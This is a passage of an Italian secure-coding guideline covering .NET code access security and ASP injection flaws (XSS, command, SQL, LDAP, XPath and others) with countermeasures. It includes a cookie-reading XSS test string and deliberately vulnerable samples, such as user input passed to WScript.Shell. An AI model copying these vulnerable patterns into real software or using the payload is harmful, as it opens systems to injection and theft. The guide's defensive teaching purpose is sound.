errori sui parametri; non verificare la correttezza  dei parametri; potrebbero funzionare in modo non 
corretto o causare qualche problema. L'utente dovre bbe essere informato di questi casi e adottare le 
misure appropriate per proteggerli. 
In alcuni casi, potrebbe essere necessario limitare  i metodi che non sono destinati all'uso generalizz ato da 
parte del pubblico, ma che devono comunque essere e sposti pubblicamente. Ad esempio, nel caso di 
un'interfaccia che deve essere chiamata attraverso le proprie DLL e pertanto deve essere pubblica, ma che 
non si vuole esporre pubblicamente, per evitare che  il suo punto d’ingresso possa essere sfruttato da 
codice dannoso. Un altro motivo comune per limitare  un metodo non destinato all'uso pubblico (ma che 
deve essere pubblico) consiste nell'evitare di dove r documentare e supportare quella che potrebbe esse re 
un'interfaccia molto interna. 
Il codice gestito (managed code) offre diverse poss ibilità per essere adeguatamente protetto: 
Limitare l'ambito di accessibilità alla classe, all 'assembly o alle classi derivate, se queste sono af fidabili. 
Questo è il modo più semplice per limitare l'access o al metodo. Si noti che, in generale, le classi de rivate 
possono essere meno affidabili della classe da cui derivano, sebbene in alcuni casi condividano l'iden tità 
della classe genitore. In particolare, non dedurre il grado di sicuerzza dalla parola chiave protected , che 
viene utilizzata in un contesto non necessariamente  relativo alla sicurezza. 
Limitare l'accesso del metodo a determinati chiaman ti. Il criterio di selezione può essere il nome sic uro 
(strong name), l’identità di chi lo pubblica, la zo na, ecc. 
Limitare l'accesso del metodo ai chiamanti che disp ongono di specifiche autorizzazioni. 
Analogamente la sicurezza delle dichiarazioni conse nte di controllare l'ereditarietà delle classi. È p ossibile 
utilizzare InheritanceDemand per eseguire le seguen ti operazioni: 
• Imporre che le classi derivate abbiano un'identità o un'autorizzazione specificate. 
• Imporre alle classi derivate di sostituire metodi s pecifici per avere un'identità o un'autorizzazione 
specifici. 
L'esempio seguente illustra come proteggere una cla sse pubblica, limitando l'accesso, con la richiesta  che i 
chiamanti si firmino con un nome sicuro specifico.  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 106  a 156  
 
Viene qui utilizzata la funzione  StrongNameIdentit yPermissionAttribute con una richiesta di nome sicu ro: 
  
[StrongNameIdentityPermissionAttribute(SecurityActi on.Demand, 
PublicKey= "…hex…" , Name= "App1" , Version= "0.0.0.0" )] 
public class Class1 
{ 
 
} 
7.6.10.5  Protezione e campi pubblici di sola lettura 
Non utilizzare mai campi pubblici di sola lettura d alle librerie managed in quanto i campi pubblici di  sola 
lettura possono essere modificati.  
Alcune classi di framework .NET includono campi pub blici di sola lettura che contengono parametri di 
confine specifici per la piattaforma. Ad esempio, i l campo InvalidPathChars è un array che descrive i 
caratteri che non sono consentiti in una stringa de l percorso di file. 
I valori dei campi pubblici di sola lettura come In validPathChars possono essere modificati dal codice  o dal 
codice che condivide il dominio di applicazione. Se  si utilizzano i campi pubblici in sola lettura, co me 
InvalidPathCharsi, il codice dannoso può alterare l e definizioni dei limiti e utilizzare il codice in modi 
inaspettati. 
Nella versione 2.0 e versioni successive di .NET Fr amework, è necessario utilizzare metodi che restitu iscono 
un nuovo array anziché utilizzare i campi di array pubblici. Ad esempio, invece di utilizzare il campo  
InvalidPathChars, è necessario utilizzare il metodo  GetInvalidPathChars. 
Si noti che i tipi di .NET Framework non utilizzano  i campi pubblici per definire internamente i tipi di confini. 
Al contrario, il framework .NET utilizza campi priv ati separati. La modifica dei valori di questi camp i pubblici 
non altera il comportamento dei tipi di .NET Framew ork. 
7.6.10.6  Esclusione di classi e membri utilizzati da codice non attendibile 
Utilizzare le dichiarazioni illustrate in questa se zione per impedire che classi e metodi specifici, n onché 
proprietà e eventi, siano utilizzati da un codice p arzialmente attendibile. Applicare queste dichiaraz ioni a 
una classe, applica la protezione a tutti i suoi me todi, proprietà e eventi; tuttavia, si noti che l'a ccesso sul 
campo non è influenzato dalla sicurezza dichiarativ a. Si noti inoltre che le richieste di collegamento  aiutano 
a proteggere solo i chiamanti immediati e potrebber o essere ancora soggetti ad attacchi. 
In associazione con il nome sicuro, un LinkDemand v iene applicato a tutti i metodi, le proprietà e gli  eventi 
accessibili a livello pubblico per limitarne l'uso a chiamanti affidabili. Per disattivare questa funz ionalità, è 
necessario applicare l'attributo AllowPartiallyTrus tedCallersAttribute. Pertanto, la selezione esplici ta di 
classi per escludere i chiamanti non attendibili è necessaria solo per assemblies non assegnate o asse mblies 
con questo attributo; è possibile utilizzare queste  dichiarazioni per contrassegnare un sottoinsieme d i tipi in 
esso che non sono destinati a chiamanti non attendi bili. 
 
Gli esempi seguenti mostrano come evitare che class i e membri siano utilizzati da codice non attendibi le. 
Esempi: 
Per classi pubbliche non sealed: 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, 
Name= "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
public  class  CanDeriveFromMe 
{ 
} 
Per classi pubbliche sealed: 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
public  sealed  class  CannotDeriveFromMe 
{ 
} 
 
 
Linee guida per lo sviluppo sicuro Pag. 107  a 156  
 
Per classi pubbliche abstract: 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, 
Name= "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
public  abstract  class  CannotCreateInstanceOfMe_CanCastToMe{} 
Per funzioni pubbliche virtual: 
class  Base1  
{ 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, 
Name= "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )] 
  public  virtual  void  CanOverrideOrCallMe() {} 
  } 
Per funzioni pubbliche abstract: 
abstract class Base2{ 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, Name = 
"FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name = "FullTrust" )] 
public  abstract  void  MustOverrideMe(); 
} 
Per funzioni di aggiornamento pubblico in cui la cl asse di base non richiede una completa fiducia: 
class  Derived : Base1 
{   
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Demand, Name= "FullTrust" )]   
  public  override  void  CanOverrideOrCallMe()  
  { 
    base .CanOverrideOrCallMe(); 
  } 
} 
Per funzioni di aggiornamento pubblico in cui la cl asse di base richiede una completa fiducia: 
class  Derived : Base1 
{   
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name= "FullTrust" )]   
  public  override  void  CanOverrideOrCallMe()  
  { 
    base .CanOverrideOrCallMe(); 
  } 
} 
Per pubbliche interfacce: 
public  interface  ICanCastToMe  
{ 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name = "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, Name = 
"FullTrust" )] 
void  CanImplementMe(); 
} 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.LinkDema nd, Name = "FullTrust" )] 
[System.Security.Permissions.PermissionSetAttribute ( 
System.Security.Permissions.SecurityAction.Inherita nceDemand, Name = 
"FullTrust" )] 
class  Implemented : ICanCastToMe 
{ 
  public  void  CanImplementMe() 
  { 
  } 
 
 
Linee guida per lo sviluppo sicuro Pag. 108  a 156  
 
} 
7.6.10.7  Definizione delle classi 
Evitare l’utilizzo di classi Wrapper. Se il wrapper  è degno di maggiore fiducia rispetto al codice che  lo 
utilizza, si può aprire un insieme unico di debolez ze di sicurezza. Qualsiasi cosa fatta per conto di un 
chiamante, le cui autorizzazioni limitate non sono incluse nel controllo di sicurezza appropriato, è u na 
potenziale debolezza da sfruttare. 
Mai abilitare qualcosa attraverso il Wrapper che il  chiamante non potrebbe fare su se stesso. Questo è  un 
pericolo quando si effettua qualcosa che comporta u n controllo di sicurezza limitato. Quando i control li a 
livello singolo sono coinvolti, l'interposizione de l codice di Wrapper tra il chiamante reale e l'elem ento API 
in questione può facilmente causare il controllo di  sicurezza per avere successo se non dovrebbe, quin di 
indebolire la sicurezza. 
7.6.10.8  User input 
I dati utente, qualsiasi tipo di input (dati da una  richiesta Web o un URL, input ai controlli di un'a pplicazione 
Microsoft Windows Form e così via), possono influen zare negativamente il codice perché spesso vengono 
utilizzati direttamente come parametri per chiamare  altro codice. Questa situazione è analoga a un mod ulo 
dannoso che chiama il codice con parametri estranei , e dovrebbero essere prese le stesse precauzioni.  
Per cercare questi possibili bug, cercate di immagi nare quali siano i valori possibili e valutare se i l codice che 
visualizza questi dati possa gestire tutti questi c asi. È possibile risolvere questi bug attraverso ‘a dozione 
della tecnica della white list, per cui si accettan o solo i dati previsti e si rifiutano tutti gli alt ri. 
 
Alcune considerazioni importanti che coinvolgono i dati utente includono quanto segue: 
• tutti i dati contenuti in una risposta del server v engono eseguiti sulla pagina web dal client. Se il tuo 
web server prende i dati utente e li inserisce nell a pagina Web restituita, potrebbe includere ad 
esempio un tag <script> e ed essere eseguito (attac co XSS); 
• il client può richiedere qualsiasi URL; 
• la funzione eval(datiUtente) può fare qualsiasi cos a; 
• fare attenzione ai nomi utente che potrebbero avere  più di un formato canonico. Ad esempio, in 
Microsoft Windows 2000, è possibile utilizzare spes so il modulo di nome utente MYDOMAIN \ o il 
modulo username@mydomain.example.com; 
• prendere in considerazione i percorsi ingannevoli o  non validi: quelli forniti di ripetuti “..\” e que lli 
molto lunghi; 
• può esserci un uso sconsiderato del carattere (*); 
• fare attenzione all’espansione dei token (% token%) ; 
• verificare che non vi siano strani forme di percors i con un significato speciale; 
• appurare la correttezza delle versioni brevi di nom i file lunghi, come longfi ~ 1 per longfilename. 
7.6.10.9  Concorrenza 
Utilizzo di synchronized per la gestione della memo ria 
Se un metodo di una classe Dispose  non è synchronized , è possibile che il codice di cleanup all'interno di 
Dispose sia eseguito più di una volta, come illustr ato nell'esempio seguente.  
Esempio: 
void  Dispose()  
{ 
  if ( myObj != null  )  
  { 
    Cleanup(myObj); 
    myObj = null ; 
  } 
} 
 
 
Linee guida per lo sviluppo sicuro Pag. 109  a 156  
 
Poiché questa implementazione di Dispose  non è synchronized , è possibile che Cleanup  sia chiamato da 
un primo thread e poi un secondo thread prima che _ myObj  sia impostato a null . In base a ciò che accade 
quando viene eseguito il codice di cleanup, si può trattare di un problea di sicurezza o meno. 
Un problema importante con l'implementazione di Dis pose non sincronizzata comporta un reale problema 
nella gestione di risorse. La deallocazione impropr ia può causare una gestione dell’utilizzo errata, c he 
spesso conduce a vulnerabilità di sicurezza. 
In alcune applicazioni, potrebbe essere possibile c he altri thread accedano ai membri della classe pri ma che 
i loro costruttori di classe siano completamente es eguiti. È necessario esaminare tutti i costruttori di classe 
per assicurarsi che non ci siano problemi di protez ione e sincronizzare i thread, se necessario. 
7.6.10.10  Serializzazione e deserializzazione 
Poiché la serializzazione può consentire ad altri m oduli di visualizzare o modificare i dati di istanz a 
dell'oggetto che altrimenti sarebbero inaccessibili , è necessaria una autorizzazione speciale per la 
serializzazione del codice. Per default questa auto rizzazione non viene fornita al codice scaricato da  
internet o intranet; solo al codice sul computer lo cale è concessa questa autorizzazione. 
Normalmente, tutti i campi dell'istanza di un ogget to vengono serializzati, il che significa che vengo no 
serializzati anche i dati. È possibile che il codic e possa interpretare il formato per determinare i v alori dei 
dati, indipendentemente dall'accessibilità dei sing oli membri. Analogamente, la deserializzazione estr ae i 
dati dalla rappresentazione serializzata e imposta lo stato dell'oggetto direttamente, di nuovo 
indipendentemente dalle regole di accessibilità. 
Qualsiasi oggetto che potrebbe contenere dati sensi bili alla sicurezza dovrebbe essere reso non serial izable. 
Se trettamente necessario adottare questa tecnica, occorre comunque creare campi specifici non 
serializzabili, quelli che - per esempio - contenga no dati sensibili. Se questo non può essere fatto, tenere 
presente che questi dati saranno esposti a qualsias i modulo che abbia l'autorizzazione a 
serializzare/deserializzare. In tal caso assicurars i che nessun modulo non attendibile possa ottenere tale 
autorizzazione. 
L'interfaccia ISerializable  è destinata esclusivamente all'infrastruttura di s erializzazione. Se si fornisce 
una serializzazione personalizzata implementando ISerializable , assicurarsi di adottare le seguenti 
precauzioni:  
Il metodo GetObjectData  dovrebbe essere protetto in modo esplicito o richi edendo l'autorizzazione 
SecurityPermission con SerializationFormatter speci ficata. Occorre anche assicurarsi che non venga 
rilasciata alcuna informazione sensibile con l'outp ut del metodo.  
Esempio: 
[SecurityPermissionAttribute(SecurityAction.Demand, SerializationFormatter = true )] 
public  override  void  GetObjectData(SerializationInfo info,  
StreamingContext context) 
{ 
} 
Il costruttore speciale utilizzato per la serializz azione dovrebbe inoltre eseguire una convalida comp leta 
degli input e dovrebbe essere dichiarata private o protected per proteggere la classe da un uso improp rio e 
abusivo.  
7.7  ASP 
ASP (Active Server Page) identifica non un linguagg io di programmazione, ma una tecnologia Microsoft, per 
la creazione di pagine web dinamiche attraverso lin guaggi di script come VBScript e Microsoft JScript.  ASP 
sfrutta non solo la connettività del web server ma,  si può interfacciare (attraverso oggetti COM) con tutte le 
risorse disponibili sul server e, in maniea traspar ente, sfruttare tecnologie diverse. 
Vengono di seguito analizzate le principali vulnera bilità e relative contromisure da adottare. 
7.7.1  Cross-site scripting (XSS) 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 110  a 156  
 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli (encoding). La codifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• Si consiglia di utilizzare la libreria di codifica ESAPI di OWASP. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
Esempio: 
ASP offre la possibilità di fare l’encoding delle s tringhe dell’input (HTMLEncode): 
<% 
  Function XSS_Filter(MyQueryString) 
    If IsNumeric(MyQueryString) Then 
      MyQueryString = CInt(MyQueryString) 
    Else 
      MyQueryString = Server.HTMLEncode(MyQueryStri ng) 
    End If 
    XSS_Filter = MyQueryString 
  End Function 
%> 
Tale funzione verrebbe chiamata in questo modo: 
<% 
  Dim parametro 
  parametro = XSS_Filter(Request.QueryString("param etro")) 
%> 
 
 
Linee guida per lo sviluppo sicuro Pag. 111  a 156  
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html  CWE-79: Improper 
Neutralization of Input During Web Page Generation ('Cross-site Scripting') 
7.7.2  Code Injection 
Come riconoscerla 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
Come difendersi. 
È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è prorpio nec essario 
compilare ed eseguire dinamicamente del codice dina mico, occorre allore predisporre una sandbox isolat a, 
ad esempio AppDomain di .NET o un thread isolato.  
Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di priv ilegi 
non necessari. 
Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato e  
dedicato che abbia privilegi solo per le operazioni  e i file specifici utilizzati dal codice da esegui re, in base al 
principio denominato "Principle of Least Privilege" . Il principio stabilisce che agli utenti venga att ribuito il 
più basso livello di “diritti” che possano, detener e rimanendo comunque in grado di compiere il propri o 
lavoro. 
 
Esempio: 
Il seguente codice permette di filtrare eventuale c odice dannoso: 
<% 
strHTML = "<s" & "cript>alert(document.cookie);</s"  & "cript>" 
 
' code injection 
Response.Write(strHTML) 
 
' protetto 
Response.Write(Server.HtmlEncode(strHTML)) 
%> 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/94.html  , 
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
 
7.7.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i non 
viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
 
 
Linee guida per lo sviluppo sicuro Pag. 112  a 156  
 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Esempio: 
Uno script ASP che invoca una shell di Sistema, uti lizzando l’input utente può essere molto pericolosa : 
   <% 
Set oWSH= Server.CreateObject("WScript.Shell") 
oWSH.Run Request.QueryString("parametro")+ “ param1  param2”, 1, True 
set oWSH = nothing 
   %> 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html , 
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.7.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al al databas e oppure al server. 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
 
Come difendersi 
 
 
Linee guida per lo sviluppo sicuro Pag. 113  a 156  
 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata. 
• Le stringhe di connessione possono essere custodite  nel file web.config.  Si tratta di una scelta 
migliore rispetto a comporle a runtime con l’input dell’utente. Si separa così l’applicazione dai 
metadati. Il file di configurazione in questione de ve essere messo in sicurezza attivano la modalità 
“protected configuration”, che permette di memorizz are le stringhe di connessione in forma 
crittografata (encrypted). 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.7.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.7.6  XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
 
 
Linee guida per lo sviluppo sicuro Pag. 114  a 156  
 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
Esempio :  
L'applicazione utilizza una stringa inserita dall'u tente per costruire una query XPath: 
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + userInput, doc) 
 
La stringa inserita dall'utente viene trasformata i n un numero intero prima dell'uso nella query XPath : 
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + str(int(userInput)), doc) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html , 
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.7.7  Resource Injection 
Come riconoscerla  
Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
• In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non dovrebbero utilizzare l’input d ell’utente per accedere a risorse del sistema. Nel 
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
7.7.8  SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
 
 
Linee guida per lo sviluppo sicuro Pag. 115  a 156  
 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list Occorre controllare il tipo del dato, l a 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
 
Esempio: 
La query ottenuta dinamicamente tramite concatenazi one di stringhe viene resa sicura effettuando 
un’encoding mirato del valore in input. 
 
<% 
Function FixSQL(stringa) 
 stringa = Replace(stringa, "'", "''") 
 stringa = Replace(stringa, "%", "[%]") 
 stringa = Replace(stringa, "[", "[[]") 
 stringa = Replace(stringa, "]", "[]]") 
 stringa = Replace(stringa, "_", "[_]") 
 stringa = Replace(stringa, "#", "[#]") 
 FixSQL = stringa 
End function 
 
SQL = "SELECT * FROM tabella WHERE ID = '" & FixSQL (Request("ID")) & "'" 
%> 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html , 
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.8  ASP.NET 
ASP.NET è un insieme di tecnologie di sviluppo di s oftware per il web, commercializzate da Microsoft. 
Utilizzando queste tecnologie gli sviluppatori poss ono realizzare applicazioni Web e servizi Web (Web 
Service). Sebbene il nome ASP.NET derivi da ASP (Ac tive Server Pages), la vecchia tecnologia per lo sv iluppo 
web di Microsoft, esistono sostanziali differenze f ra le due. Infatti ASP.NET si basa, come tutte le 
applicazioni della famiglia Microsoft .NET, sul CLR  (Common Language Runtime). 
 
Vengono di seguito analizzate le principali vulnera bilità e relative contromisure da adottare. 
7.8.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
 
 
